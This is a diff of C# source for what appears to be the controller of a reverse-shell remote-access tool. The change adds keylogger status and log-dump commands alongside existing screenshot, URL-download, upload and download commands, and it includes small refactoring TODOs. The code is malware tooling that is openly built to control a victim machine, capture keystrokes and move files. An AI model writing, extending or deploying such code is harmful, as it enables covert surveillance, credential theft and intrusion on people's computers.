@@ -115,6 +115,12 @@ namespace ReverseShellClient
                         case "{UploadFileToClient:init}":
                             tools.DownloadFile(toolsFilePath);
                             break;
+                        case "{Keylogger:status}":
+                            tools.GetKeyloggerStatus();
+                            break;
+                        case "{Keylogger:dump}":
+                            tools.DumpKeyloggerLogs();
+                            break;
                         default:
                             // Normal output (text)
                             // Check if the line isn't the one representing the path in the cmd
@@ -148,6 +154,8 @@ namespace ReverseShellClient
 
         void ProcessInput()
         {
+            // TODO : refactor this function and preprocesscommand for cleaner approach :: list of objects 
+            // TODO : -> name of command, arguments, incorporated analysis method for args, delegate for method to call, bool for blocking or not
             while (true)
             {
                 var command = Console.ReadLine();
@@ -169,6 +177,7 @@ namespace ReverseShellClient
                 {
                     // Clear console
                     Console.Clear();
+                    // TODO : still display the cmd line
                 }
                 else if (command == "")
                 {
@@ -189,7 +198,7 @@ namespace ReverseShellClient
                     }
                     else if (result == "fileError")
                     {
-                        ConsoleColorTools.WriteCommandError("The specified folder / file doesn't exist");
+                        ConsoleColorTools.WriteCommandError("The specified file doesn't exist");
                     }
                 }
             }
@@ -205,17 +214,17 @@ namespace ReverseShellClient
             {
                 command = "dir";
             }
-            else if (commandPart == "#screenshot" || commandPart == "#downloadurl" || commandPart == "#upload" || commandPart == "#download" || commandPart == "lcd" || commandPart == "lcwd" || commandPart == "lls")
+            else if (commandPart == "screenshot" || commandPart == "downloadurl" || commandPart == "upload" || commandPart == "download" || commandPart == "lcd" || commandPart == "lcwd" || commandPart == "lls" || commandPart == "keylogger")
             {
-                if (commandPart != "#screenshot")
+                if (commandPart != "screenshot")
                 {
                     if (command.Split(' ').Length == 2)
                     {
                         var argumentPart = command.Split(' ')[1];
-                        if (commandPart == "#upload" || commandPart == "#download")
+                        if (commandPart == "upload" || commandPart == "download")
                         {
                             // Local file exists for upload ?
-                            if (commandPart == "#upload" && !File.Exists(argumentPart))
+                            if (commandPart == "upload" && !File.Exists(argumentPart))
                             {
                                 result = "fileError";
                             }
